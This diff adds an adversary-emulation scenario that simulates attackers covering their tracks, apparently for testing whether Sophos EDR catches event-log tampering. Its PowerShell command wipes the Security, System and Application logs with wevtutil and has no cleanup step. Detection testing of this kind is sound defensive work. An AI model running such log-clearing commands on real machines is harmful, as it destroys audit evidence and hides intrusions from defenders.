@@ -1,0 +1,53 @@
+---
+- id: scn016-a1-event-log-clearing
+  name: "SCN-016 | Clear Windows Event Logs"
+  description: |
+    Clears the Windows Security, System, and Application event logs using
+    the built-in wevtutil command. This is one of the most common anti-forensics
+    techniques — attackers clear logs to hide evidence of their activity.
+
+    MITRE ATT&CK: T1070.001 - Indicator Removal: Clear Windows Event Logs
+
+    Every modern EDR immediately flags event log clearing because there is
+    almost never a legitimate reason to clear Security logs on an endpoint.
+
+    What to watch for:
+    - Sophos alert for event log tampering / clearing
+    - Windows Event ID 1102 (Security log cleared) generated before the log is wiped
+    - Defense evasion classification
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.001
+    name: "Indicator Removal: Clear Windows Event Logs"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== EVENT LOG CLEARING (T1070.001) ===";
+          Write-Output "[*] This simulates an attacker clearing logs to cover their tracks";
+          Write-Output "";
+          Write-Output "[*] Querying current log entry counts...";
+          $secCount = (Get-WinEvent -LogName Security -MaxEvents 1 -ErrorAction SilentlyContinue).RecordId;
+          $sysCount = (Get-WinEvent -LogName System -MaxEvents 1 -ErrorAction SilentlyContinue).RecordId;
+          $appCount = (Get-WinEvent -LogName Application -MaxEvents 1 -ErrorAction SilentlyContinue).RecordId;
+          Write-Output "  Security log : ~$secCount entries";
+          Write-Output "  System log   : ~$sysCount entries";
+          Write-Output "  Application  : ~$appCount entries";
+          Write-Output "";
+          Write-Output "[*] Clearing Security event log...";
+          wevtutil cl Security 2>&1;
+          Write-Output "[+] Security log cleared";
+          Write-Output "[*] Clearing System event log...";
+          wevtutil cl System 2>&1;
+          Write-Output "[+] System log cleared";
+          Write-Output "[*] Clearing Application event log...";
+          wevtutil cl Application 2>&1;
+          Write-Output "[+] Application log cleared";
+          Write-Output "";
+          Write-Output "[*] In a real attack, clearing logs is one of the last steps";
+          Write-Output "    an attacker takes before exiting. Sophos detects this";
+          Write-Output "    immediately because legitimate admins rarely clear Security logs.";
+          Write-Output "";
+          Write-Output "[*] Sophos should flag: Event log tampering / anti-forensics";
+          Write-Output "=== END EVENT LOG CLEARING ==="
+        cleanup: ""
